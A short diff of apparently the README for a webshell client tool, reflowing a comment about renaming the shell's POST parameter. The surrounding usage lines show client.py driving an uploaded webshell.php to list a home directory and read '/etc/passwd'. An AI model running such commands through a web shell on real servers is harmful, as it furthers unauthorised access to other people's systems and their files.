@@ -55,7 +55,8 @@ python3 client.py -u http://example.com/webshell.php -t dir -p "/home/user/"
 ```
 Read file contents:
 ```sh
-# you can change the name of the parameter that the webshell uses ("payload") before uploading it to whatever you want ("cmd" for example) and then use --post-param to specify the parameter.
+# you can change the name of the parameter that the webshell uses ("payload") before uploading it,
+# to whatever you want ("cmd" for example), and then use --post-param to specify the parameter.
 # you can also change the `DEFAULT_POST_PARAM` parameter in `client.py` if you don't want to pass it as an argument everytime
 python3 client.py -u http://example.com/webshell.php -t cat -p "/etc/passwd" --post-param "cmd"
 ```
